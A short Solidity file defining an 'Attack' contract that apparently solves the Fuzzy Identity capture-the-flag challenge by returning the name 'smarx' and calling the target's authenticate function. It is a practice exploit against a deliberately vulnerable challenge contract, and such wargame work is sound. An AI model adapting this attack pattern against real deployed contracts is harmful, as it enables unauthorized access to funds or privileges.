pragma solidity ^0.4.21;

import {FuzzyIdentityChallenge} from "./FuzzyIdentity.sol";

contract Attack {
    FuzzyIdentityChallenge private target;

    constructor(address _address) public {
        target = FuzzyIdentityChallenge(_address);
    }

    function name() external pure returns(bytes32) {
        return bytes32("smarx");
    }

    function hack() external {
        target.authenticate();
    }
}